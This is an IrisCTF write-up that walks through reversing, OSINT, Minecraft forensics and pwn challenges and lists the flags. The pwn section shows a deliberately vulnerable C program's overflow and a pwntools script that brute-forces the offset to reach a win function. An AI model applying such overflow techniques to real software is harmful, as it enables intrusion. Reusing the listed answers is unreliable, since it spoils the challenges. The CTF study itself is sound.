# IrisCTF Writeup

Hello, I'm 9x14S and I participated on this CTF as part of the 0xE0F team. 

## Flags
- Rune? What's that? (Reversing) (got 50 points): `irisctf{i_r3411y_1ik3_num63r5}`
- Insanity Check (Pwn) (got 50 points):  `irisctf{c0nv3n13nt_symb0l_pl4cem3nt}`
- Away on vacation (OSINT) (got 50 points): `irisctf{pub1ic_4cc0unt5_4r3_51tt1ng_duck5}`
- Czech Where? (OSINT) (got 50 points): `irisctf{zlata_ulicka_u_daliborky}`
- Survey (Welcome) (got 50 points): `irisctf{th@nk5_4_pL@y1ng_2024}`
- Corrupted World (Forensics) (solved by Havel29): ` irisctf{block_game_as_a_file_system}`

## Solutions

### Rune (REV)

The challenge consists of the following Go source code:
```go=
package main

import (
        "fmt"
        "os"
        "strings"
)

var flag = "irisctf{this_is_not_the_real_flag}"

func init() {
        runed := []string{}
        z := rune(0)

        for _, v := range flag {
                runed = append(runed, string(v+z))
                z = v
        }

        flag = strings.Join(runed, "")
}

func main() {
        file, err := os.OpenFile("the", os.O_RDWR|os.O_CREATE, 0644)
        if err != nil {
                fmt.Println(err)
                return
        }

        defer file.Close()
        if _, err := file.Write([]byte(flag)); err != nil {
                fmt.Println(err)
                return
        }
}

```

And also a file called `the` containing the following string: ```iÛÛÜÖ×ÚáäÈÑ¥gebªØÔ``` 
This text contains the encoded flag. 

Looking at the source code, this function stands out: 
```go=
func init() {
        runed := []string{}
        z := rune(0)

        for _, v := range flag {
                runed = append(runed, string(v+z))
                z = v
        }

        flag = strings.Join(runed, "")
}
```
This function takes the flag string, and encodes it into what ends up being the `the` file's string. 
The way I solved this, is by noticing that it iterated over each character of the string and added the previous character's value to it, and then joined that character into the output string, ready to be written to the file.

My actual solution was to use the source file itself to reverse the algorithm, like this:
```go=
package main

import (
        "fmt"
        "os"
)

func main() {
    z := rune(0)

    array := []byte{}
    array, _ = os.ReadFile("the")

    flag := string(array)

    outstring := []string{}
    for _, v := range flag {
        v = v - z
        outstring = append(outstring, string(v))
        z = v
    }
    fmt.Println(outstring)
}
```

This outputs the flag: `irisctf{i_r3411y_1ik3_num63r5}`

### Insanity Check (PWN)

This challenge provides two files: `vuln` (binary) and `vuln.c` (source code).

The source is this: 
```c=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void rstrip(char* buf, const size_t len) {
    for (int i = len - 1; i >= 0; i--)
        if (buf[i] == '\n') {
            buf[i] = '\0';
            break;
        }
}

const char suffix[] = "! Welcome to IrisCTF2024. If you have any questions you can contact us at test@example.com\0\0\0\0";

int main() {
    char message[128];
    char name[64];
    fgets(name, 64, stdin);
    rstrip(name, 64);

    strcpy(message, "Hi there, ");
    strcpy(message + strlen(message), name);
    memcpy(message + strlen(message), suffix, sizeof(suffix));

    printf("%s\n", message);
}

__attribute__((section(".flag")))
void win() {
    __asm__("pop %rdi");
    system("cat /flag");
}
```

Immediately, I focus on the `win` function, which gives us the flag. I also notice this piece 
```c
__attribute__((section(".flag")))
``` 
with the word `section` in it. I guessed that this piece made a custom file section where this function is stored, so I checked with `objdump` and got this output:
```
Disassembly of section .flag:

000000006d6f632e <win>:
    6d6f632e:   55                      push   %rbp
    6d6f632f:   48 89 e5                mov    %rsp,%rbp
    6d6f6332:   5f                      pop    %rdi
    6d6f6333:   bf 1f 0a 00 40          mov    $0x40000a1f,%edi
    6d6f6338:   e8 b3 a3 90 d2          call   400006f0 <system@plt>
    6d6f633d:   90                      nop
    6d6f633e:   5d                      pop    %rbp
    6d6f633f:   c3                      ret

```
So I was right, that piece made a section in the binary. Now to the important part: how do we get to there? 
I noticed that the address of the section had characters in the printable ASCII range, so I ran `unhex 000000006d6f632e` and got '`moc.`' as output.

After that, I looked again at the source, trying to find a vulnerability, and found one: 
```c=
    strcpy(message, "Hi there, ");
    strcpy(message + strlen(message), name);
    memcpy(message + strlen(message), suffix, sizeof(suffix));
```
Which is a clear buffer overflow, given that the `message` buffer is only 128 bytes long, yet here it writes 10 (`"Hi there, "`) + 64 (read from stdin) + `sizeof suffix` (I'm too lazy to count the characters), which looks to be longer than 64 characters. 

I then noticed that there were four null bytes at the end, and it clicked to me that the `moc.` was actually a `.com`, and the four null bytes + `.com` made the target address. In the end, I just went for the easy way of just bruteforcing the exact offset in the local binary, using this script:

```python=
from pwn import *

context.log_level = "debug"
def poun(bf=0):
    t = process("./vuln")
    # t = remote("insanity-check.chal.irisc.tf", 10003)

    t.sendline(b"A" * bf)

    t.interactive()
    t.close()

for i in range(128):
    print(f"{i=}")
    poun(i)

```

Until I had the exact amount of characters: `56`.

After that, I just ran it on remote and got the flag.

Flag: `irisctf{c0nv3n13nt_symb0l_pl4cem3nt}`

### Away on vacation (OSINT)

This challenge had this email in the description: `michelangelocorning0490@gmail.com`

Searching for `michelangelo corning` in DuckDuckGo returned the following Instagram account: `https://www.instagram.com/michelangelo_corning/`

The flag is contained in one of the posts
![image](https://hackmd.io/_uploads/HyoLhMidp.png)

Flag: `irisctf{pub1ic_4cc0unt5_4r3_51tt1ng_duck5}`

### Czech where?

This challenge provides this image: 
![image](https://hackmd.io/_uploads/ryyh2GsOT.png)

For which I just reverse searched with Yandex. The results were that this place was in a street called 'Zlatá ulička', (Golden lane) in Prague.

The challenge description said that the flag is the name of the complete street name in Czech, (that is, "Zlatá ulička u daliborky"), in lowercase and replacing spaces with underscores.

Flag: `irisctf{zlata_ulicka_u_daliborky}`


### Corrupted World (solved by Havel29)

In the description of the challenge one can read that the challenge is based on a game called Minecraft. 
In particular, the attachment is a file named `r.0.0.mca.` 

In the environment of Minecraft, such files are used to render chunks. Therefore, it is likely that we have to replace some of the chunks in our world (you can either create one or use an existing one) with the one provided. 

For simplicity, I created a minecraft server on my VPS (in the version specified in the challenge description i.e. 10.20.2) ([refer to this video for a tutorial](https://www.youtube.com/watch?v=ejW1A-8C3hc&t=1s&ab_channel=TheBreakdown)) and started it. Under the world folder, one can find the region folder, which contains all the data concerning the chunks the server will load once the player logs in. In particular, I replaced the already existing r.0.0.mca file (I assume each file covers different coordinates in the game).

Finally, I started the server and ran the command `tp {user} 104 63 248` to teleport myself to the hinted coordinates and found a chest. By opening the chest, I found out there were some books in it. Each book's title contains part of the flag, so one just need to concatenate them all to obtain the final flag.

Flag: `irisctf{block_game_as_a_file_system}`

### Survey

Just filled a survey.

Flag: `irisctf{th@nk5_4_pL@y1ng_2024}`
